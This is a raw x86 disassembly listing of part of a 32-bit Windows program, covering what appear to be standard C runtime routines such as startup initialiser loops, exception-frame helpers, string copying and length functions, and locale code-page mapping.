  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
